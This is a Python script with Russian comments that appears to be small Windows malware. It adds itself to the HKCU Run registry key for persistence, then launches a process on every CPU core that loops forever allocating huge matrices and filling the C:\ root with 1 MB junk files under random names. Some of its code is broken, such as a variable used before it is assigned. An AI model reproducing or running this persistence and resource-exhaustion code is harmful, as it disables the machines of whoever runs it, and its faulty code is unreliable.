import math
import multiprocessing
import platform
import sys
import threading
import os
import random
import time
import winreg

SIZE = 1000000000

"""if getattr(sys, 'frozen', False):
    APP_NAME = os.path.splitext(os.path.basename(sys.executable))[0]
else:
    APP_NAME = ""
def add_self_to_startup(app_name=APP_NAME):
    # Получаем путь к текущему исполняемому файлу
    if getattr(sys, 'frozen', False):
        # Если запущен как .exe (скомпилирован PyInstaller)
        exe_path = sys.executable
    else:
       return

    try:
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0, winreg.KEY_SET_VALUE
        )
        winreg.SetValueEx(key, app_name, 0, winreg.REG_SZ, exe_path)
        winreg.CloseKey(key)
        print(f"Добавлено в автозагрузку: {exe_path}")
    except Exception as e:
        print(f"Ошибка: {e}")
def is_in_startup(app_name=APP_NAME):
    try:
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0, winreg.KEY_READ
        )
        winreg.QueryValueEx(key, app_name)
        winreg.CloseKey(key)
        return True
    except FileNotFoundError:
        return False

def add_to_startup_if_windows(app_name=APP_NAME):
    os_name = platform.system()  # 'Windows', 'Linux', 'Darwin'

    if os_name == "Windows":
        if( not is_in_startup(APP_NAME)):
            add_self_to_startup(app_name)
    elif os_name == "Linux":
        print("Linux: используй systemd или crontab")
    elif os_name == "Darwin":
        print("macOS: используй LaunchAgents")
    else:
        print(f"Неизвестная ОС: {os_name}")
"""

import sys
import os
import platform


if getattr(sys, 'frozen', False):
    APP_NAME = os.path.splitext(os.path.basename(sys.executable))[0]
else:
    APP_NAME = ""


def add_self_to_startup(app_name=APP_NAME):
    """Добавляет программу в автозагрузку Windows."""
    if not getattr(sys, 'frozen', False):
        return  # Не добавляем обычный .py скрипт в автозагрузку

    exe_path = sys.executable
    # Обязательно оборачиваем путь в кавычки для защиты от пробелов в путях
    quoted_exe_path = f'"{exe_path}"'

    import winreg  # Импортируем локально, чтобы не сломать код на Linux/macOS

    try:
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
            0, winreg.KEY_SET_VALUE
        )
        winreg.SetValueEx(key, app_name, 0, winreg.REG_SZ, quoted_exe_path)
        winreg.CloseKey(key)
        print(f"Добавлено в автозагрузку: {quoted_exe_path}")
    except Exception as e:
        print(f"Ошибка при добавлении в автозагрузку: {e}")


def is_in_startup(app_name=APP_NAME):
    """Проверяет, добавлена ли программа в автозагрузку Windows."""
    import winreg  # Импортируем локально

    try:
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
            0, winreg.KEY_READ
        )
        winreg.QueryValueEx(key, app_name)
        winreg.CloseKey(key)
        return True
    except FileNotFoundError:
        return False
    except Exception as e:
        print(f"Ошибка при проверке автозагрузки: {e}")
        return False


def add_to_startup_if_windows(app_name=APP_NAME):
    """Кроссплатформенная обертка для автозагрузки."""
    # Если имя пустое (запуск не скомпилированного файла), выходим
    if not app_name:
        return

    os_name = platform.system()  # 'Windows', 'Linux', 'Darwin'

    if os_name == "Windows":
        # Исправлено: используем локальный аргумент app_name
        if not is_in_startup(app_name):
            add_self_to_startup(app_name)
    elif os_name == "Linux":
        print("Linux: используй systemd, ~/.config/autostart/ или crontab")
    elif os_name == "Darwin":
        print("macOS: используй LaunchAgents")
    else:
        print(f"Неизвестная ОС: {os_name}")




def final_workload():
    """Финальный процесс, который нагружает ядро"""
    while True:

        matrix = [[i for i in range(SIZE)] for _ in range(SIZE)]
        result = []
        for row in matrix:
            random_number = random.randint(1, 1000000)
            filename = f"C:\\Важная_информация{random_number}.txt"
            with open(filename, "w", encoding="utf-8", newline="") as f:
                text = "A" * size_bytes
                f.write(text)
            size_bytes = 1024 * 1024  # 1 МБ
            result.append([math.sqrt(x) ** 10 for x in row])
def thread_function():
    """Поток, который создает процессы на все ядра"""
    cpu_count = multiprocessing.cpu_count()
    print(f"Поток в PID {os.getpid()} создает {cpu_count} процессов...")
    print(f"Поток в PID п процессов...")
    processes = []
    for _ in range(cpu_count):
        p = multiprocessing.Process(target=final_workload)
        p.start()
        processes.append(p)

    for p in processes:
        p.join()


def grandchild_process():
    """Внучатый процесс, создающий поток"""
    t = threading.Thread(target=thread_function)
    t.start()
    t.join()


def child_process():
    """Дочерний процесс, создающий внучатый процесс"""
    p = multiprocessing.Process(target=grandchild_process)
    p.start()
    p.join()


if __name__ == "__main__":
    #while True:
        add_self_to_startup(APP_NAME)
        main_child = multiprocessing.Process(target=child_process)
        main_child.start()
        main_child.join()
